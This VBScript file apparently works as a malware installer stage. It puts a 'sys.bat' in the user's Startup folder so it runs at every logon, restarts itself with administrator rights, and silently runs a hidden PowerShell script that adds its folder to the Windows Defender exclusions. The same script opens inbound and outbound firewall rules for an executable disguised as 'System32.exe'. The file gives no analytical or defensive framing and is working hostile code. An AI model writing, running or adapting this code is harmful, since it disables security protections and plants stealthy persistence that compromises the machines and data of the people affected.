Set WshShell = CreateObject("WScript.Shell")
Dim username
username = CreateObject("WScript.Network").UserName
Dim scriptPath
scriptPath = Left(WScript.ScriptFullName, InStrRev(WScript.ScriptFullName, "\"))

' Function to check if a file or folder exists
Function FileOrFolderExists(path)
    Dim objFSO
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    If objFSO.FileExists(path) Or objFSO.FolderExists(path) Then
        FileOrFolderExists = True
    Else
        FileOrFolderExists = False
    End If
End Function

' Check if the sys.bat file exists
Dim sysBatFile
sysBatFile = scriptPath & "sys.bat"
If Not FileOrFolderExists(sysBatFile) Then
    MsgBox "The sys.bat file does not exist!", vbCritical, "Error"
    WScript.Quit
End If

' Create the shortcut
Set objShell = CreateObject("WScript.Shell")
strAppData = objShell.ExpandEnvironmentStrings("%APPDATA%")
strShortcutFolder = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup"
strShortcutName = "sys.lnk"
strTargetPath = sysBatFile
strShortcutPath = strShortcutFolder & "\" & strShortcutName

Set objShortcut = objShell.CreateShortcut(strShortcutPath)
objShortcut.TargetPath = strTargetPath
objShortcut.Save

' Rest of your existing code...
If WScript.Arguments.Count = 0 Then
  Set ObjShell = CreateObject("Shell.Application")
  ObjShell.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ Run", , "runas", 1
Else
  Set objFSO = CreateObject("Scripting.FileSystemObject")
  outFile = scriptPath & "addExclusion.ps1"
  Set objFile = objFSO.CreateTextFile(outFile, True)
  objFile.Write "Add-MpPreference -ExclusionPath """ & scriptPath & """" & vbCrLf
  objFile.Write "$exePath = """ & scriptPath & "System32.exe""" & vbCrLf
  objFile.Write "New-NetFirewallRule -DisplayName ""Allow System32 Inbound"" -Direction Inbound -Program $exePath -Action Allow -Protocol Any" & vbCrLf
  objFile.Write "New-NetFirewallRule -DisplayName ""Allow System32 Outbound"" -Direction Outbound -Program $exePath -Action Allow -Protocol Any" & vbCrLf
  objFile.Close

  Dim cmd
  cmd = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File " & outFile
  WshShell.Run cmd, 0
End If

